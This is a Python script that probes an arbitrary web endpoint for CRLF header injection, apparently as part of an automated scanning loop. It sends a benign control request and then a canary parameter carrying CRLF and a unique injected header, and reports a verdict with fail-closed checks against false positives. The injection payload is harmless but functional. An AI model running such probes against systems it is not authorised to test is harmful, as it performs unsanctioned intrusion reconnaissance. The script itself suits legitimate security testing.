#!/usr/bin/env python3
"""Generic header-injection / CRLF probe for an UNKNOWN query sink.

Rule #64: the one loop hunts targets it has never seen — this probe
takes the sink spec from its marker argv (the loop encodes it there so
_probe_cmd needs no changes):

    MARKER = PLOOP64|<target_base>|<path>|GET|<p1,p2>

A header-injection claim needs the TARGET's server to parse an
attacker-controlled CRLF sequence inside a reflected parameter as a
REAL HTTP response header. The probe proves this per param:

  1. CONTROL: GET path?<p>=ploop64-benign — the endpoint must answer;
     it carries no canary so it can never confirm.
  2. CANARY: GET path?<p> set to
         ploop64-benign<CRLF>X-PLOOP64-<nonce1>: ploop64-inject-<nonce2>
     (urllib encodes the CRLF as %0D%0A on the wire; the server must
     decode it back and reflect it VERBATIM into a response header).
  3. CONFIRM only when the RAW response headers (http.client, never
     following redirects) contain a header literally named
     x-ploop64-<nonce1> whose value carries ploop64-inject-<nonce2>
     -> via=header-crlf. The header name AND the value are run-unique,
     so a pre-existing header can never false-positive.

Fail-closed rules (the probe lesson, 29 Oct):
  - The injected header TEXT echoed in the response BODY is NOT a
    header injection — it is a reflection/XSS signal for the sibling
    probe and counts as FAILED here (body-echo != header injection,
    an explicit negative control).
  - A server that strips/encodes the CRLF (sanitizer) produces no
    injected header -> VERDICT: FAILED.
  - No injected header in the response headers -> VERDICT: FAILED.
  - The control request can never confirm (it carries no canary).

One self-contained reproducible command, fixed marker from argv, own
VERDICT line. Any exception -> PROBE_ERROR + VERDICT: FAILED.
"""
import http.client
import os
import sys
import urllib.parse

TIMEOUT = 15
_BENIGN = "ploop64-benign"


def _raw_get(tb, path, params):
    """GET without following redirects. Returns (code, headers, body)."""
    pu = urllib.parse.urlparse(tb.rstrip("/") + path)
    host, port = pu.hostname, pu.port
    use_ssl = pu.scheme == "https"
    q = urllib.parse.urlencode(params)
    target = pu.path + ("?" + q if q else "")
    conn_cls = (http.client.HTTPSConnection if use_ssl
                else http.client.HTTPConnection)
    conn = conn_cls(host, port or (443 if use_ssl else 80),
                    timeout=TIMEOUT)
    try:
        conn.request("GET", target,
                     headers={"User-Agent": "PLOOP64",
                              "Host": pu.netloc})
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", "replace")
        headers = {k.lower(): v for k, v in resp.getheaders()}
        return resp.status, headers, body
    finally:
        conn.close()


def main():
    # argv[1] is the marker: the _probe_cmd wrapper invokes
    #   python3 "$DST" "$MK"   (DST=argv[0], marker=argv[1])
    marker = sys.argv[1] if len(sys.argv) > 1 else "PLOOP64"
    try:
        _, tb_q, path_q, method, params_csv = marker.split("|", 4)
    except ValueError:
        print("PROBE_ERROR bad marker spec: %r" % marker)
        print("VERDICT: FAILED")
        return
    tb = urllib.parse.unquote(tb_q)
    path = urllib.parse.unquote(path_q)
    params = [p for p in params_csv.split(",") if p]
    method = (method or "GET").upper()
    if not tb or not path.startswith("/") or not params or \
            method != "GET":
        print("PROBE_ERROR invalid sink spec "
              "(header injection needs a GET query sink)")
        print("VERDICT: FAILED")
        return
    nonce1 = os.urandom(3).hex()
    nonce2 = os.urandom(3).hex()
    hdr_name = "x-ploop64-%s" % nonce1
    canary_val = "ploop64-inject-%s" % nonce2

    for p in params:
        # 1. CONTROL: a benign value must not inject anything; it
        #    carries no canary so it can never confirm.
        try:
            ccode, cheaders, _ = _raw_get(tb, path, {p: _BENIGN})
        except Exception as e:
            print("PROBE_ERROR control fetch failed for param %s: %s"
                  % (p, e))
            print("VERDICT: FAILED")
            return
        if hdr_name in cheaders:
            # Should be impossible (run-unique name) — a pre-seeded
            # collision would poison the confirm channel.
            print("PROBE_ERROR canary header name %s present on the "
                  "CONTROL response — aborting (fail-closed)" % hdr_name)
            print("VERDICT: FAILED")
            return
        # 2. CANARY: CRLF + injected header riding inside the param.
        #    urlencode emits %0D%0A; only a server that decodes AND
        #    reflects the value verbatim into a response header can
        #    confirm.
        canary = "%s\r\nX-PLOOP64-%s: %s" % (_BENIGN, nonce1, canary_val)
        try:
            code, headers, body = _raw_get(tb, path, {p: canary})
        except Exception as e:
            print("PROBE_ERROR canary fetch failed for param %s: %s"
                  % (p, e))
            print("VERDICT: FAILED")
            return
        seen = headers.get(hdr_name, "")
        if seen and canary_val in seen:
            print("EVIDENCE sink=%s param=%s via=header-crlf code=%d "
                  "header=X-PLOOP64-%s" % (path, p, code, nonce1))
            print("EVIDENCE class=header_injection via=header-crlf")
            print("VERDICT: CONFIRMED")
            return
        # Fail-closed: the injected header TEXT echoed in the BODY is
        # reflection, NOT a response header.
        if nonce1 in body or canary_val in body:
            print("PROBE_NOTE param %s: canary text echoed in the body "
                  "but no injected header in the response headers "
                  "(body-echo != header injection)" % p)
        else:
            print("PROBE_NOTE param %s: no injected header in the "
                  "response headers (CRLF stripped or not reflected "
                  "into headers)" % p)

    print("VERDICT: FAILED")


if __name__ == "__main__":
    main()
